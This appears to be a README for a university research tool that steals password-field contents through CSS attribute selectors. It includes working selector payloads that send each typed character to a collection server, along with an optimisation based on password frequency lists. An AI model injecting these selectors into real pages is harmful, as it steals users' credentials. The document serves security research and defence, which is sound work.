# Idea
By utilizing the possibilities of CSS selectors such as `input[type='password'][value$='xyz']` we can check if a password field ends with a given string. This can be used to exfiltrate the password character by character.

This idea is not new. There are already multiple implementations of this idea.
I added some improvements to the idea. See section "How it works" for more information.

# How it works

By adding multiple selectors and loading a background image from a server, we can exfiltrate the password character by character.
```
input[type="password"][value$="a"] {
    background-image: url("http://127.0.0.1:8000/?k=a");
}
input[type="password"][value$="b"] {
    background-image: url("http://127.0.0.1:8000/?k=b");
}
```

This approach has a big disadvantage. The same URL will only be requested once. This means that `hello` will by exfiltrated as `helo`.
To fix this we can generate all 2-character permutations. Let's say we have $94$ printable charaters. This will generate $94^2=8836$ selectors (which is acceptable). But this will also limit repeating patterns. Additionaly most of those permutations are rather useless. Statistically quite nobody uses `f:` inside their password. If we would extend this to 3 characters, we would have $94^3=830584$ selectors. This would be overkill.

We can easily make use of 5.000 selectors and more. To use wasted selectors, we can extract the most common 1, 2 and 3 character combinations from english passwords (like rockyou.txt).
| Combination | Count |
|-------------|-------|
| 1-char      | all   |
| 2-char      | 50 % (of the most common) |
| 3-char      | 25 % (of the most common) |
| n-char      | $100/n$ % (of the most common) |

# Usage

See the help message for usage information.
```bash
python3 server.py -h
```

The server needs a frequency histogram of the characters. You can generate one by using the `frequency_analyzer.py` script.
```bash
python3 frequency_analyzer.py -h
```

# Limitations
* Won't detect character deletion
* It can only detect character combinations once. Repeating patterns won't get exfiltrated.

# Notice
This repository was created during security research at university. It is only intended for educational purposes and should not be used for illegal activities. The author assumes no liability for any damage caused by the use of the code.